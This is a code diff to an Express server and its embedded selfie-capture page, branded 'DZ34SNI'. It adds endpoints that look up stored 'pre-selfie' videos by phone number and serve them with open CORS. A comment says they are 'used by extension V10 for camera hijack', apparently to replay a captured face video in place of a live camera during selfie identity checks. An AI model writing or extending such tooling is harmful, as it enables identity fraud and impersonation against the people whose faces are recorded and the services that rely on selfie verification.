@@ -454,6 +454,39 @@ app.post('/api/preselfie/save', (req, res) => {
 });
 
 // List all pre-selfies
+// Check if pre-selfie exists for a phone number (used by extension V10)
+app.get('/api/preselfie/check/:phone', (req, res) => {
+    const phone = req.params.phone.trim();
+    const psId = phonePreselfieMap[phone];
+    if (!psId || !preSelfies[psId]) {
+        return res.json({ ok: false, preselfie: null });
+    }
+    const ps = preSelfies[psId];
+    res.json({
+        ok: true,
+        preselfie: {
+            id: ps.id,
+            label: ps.label,
+            hasVideo: !!ps.videoData,
+            videoSize: ps.videoSize || 0,
+            captureCount: ps.captureCount
+        }
+    });
+});
+
+// Download pre-selfie video (used by extension V10 for camera hijack)
+app.get('/api/preselfie/video/:id', (req, res) => {
+    const ps = preSelfies[req.params.id];
+    if (!ps || !ps.videoData) {
+        return res.status(404).json({ ok: false, error: 'No video' });
+    }
+    const buf = Buffer.from(ps.videoData, 'base64');
+    res.setHeader('Content-Type', 'video/webm');
+    res.setHeader('Content-Length', buf.length);
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.send(buf);
+});
+
 app.get('/api/preselfies', (req, res) => {
     const list = Object.values(preSelfies).map(ps => ({
         id: ps.id,
@@ -1055,7 +1088,15 @@ h2{font-size:20px;margin-bottom:12px;text-align:center}
 <h2>🐉 DZ34SNI — Selfie</h2>
 <p class="info">Client: <b>${safeLabel}</b></p>
 
-<div class="video-container">
+<div id="start-screen" style="text-align:center;padding:40px 20px">
+  <div style="font-size:64px;margin-bottom:16px">📸</div>
+  <p style="font-size:16px;margin-bottom:6px;color:#fff;font-weight:700">Vérification Selfie</p>
+  <p style="font-size:13px;color:#94a3b8;margin-bottom:24px">Appuyez pour activer la caméra</p>
+  <button id="start-btn" onclick="startCamera()" style="padding:14px 36px;font-size:17px;font-weight:800;background:#00bfff;color:#000;border:none;border-radius:12px;cursor:pointer;box-shadow:0 4px 20px rgba(0,191,255,.4)">📷 Démarrer</button>
+  <p id="loading-text" style="font-size:12px;color:#94a3b8;margin-top:16px;display:none">Chargement des modèles...</p>
+</div>
+
+<div class="video-container" id="video-container" style="display:none">
   <video id="video" autoplay muted playsinline></video>
   <div class="face-overlay" id="circle"></div>
   <div id="face-warning">❌ Align your face</div>
@@ -1196,18 +1237,25 @@ function startRecording() {
     }, 3000);
 }
 
-async function start() {
+async function startCamera() {
+    var btn = document.getElementById('start-btn');
+    var lt = document.getElementById('loading-text');
+    btn.disabled = true;
+    btn.textContent = '⏳ Chargement...';
+    lt.style.display = 'block';
+    
     try {
         await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/');
         await faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/');
         await initCamera();
+        
+        document.getElementById('start-screen').style.display = 'none';
+        document.getElementById('video-container').style.display = 'block';
         monitorFace();
     } catch(e) {
         document.body.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#121212;color:#ff4d4f;text-align:center;padding:20px"><div style="font-size:64px;margin-bottom:20px">❌</div><div style="font-size:20px;font-weight:700">Camera Error</div><div style="font-size:14px;color:#94a3b8;margin-top:10px">' + e.message + '</div><button onclick="location.reload()" style="margin-top:20px;padding:10px 20px;background:#00bfff;color:#000;border:none;border-radius:8px;font-weight:700;cursor:pointer">Retry</button></div>';
     }
 }
-
-start();
 </script>
 </body>
 </html>`;
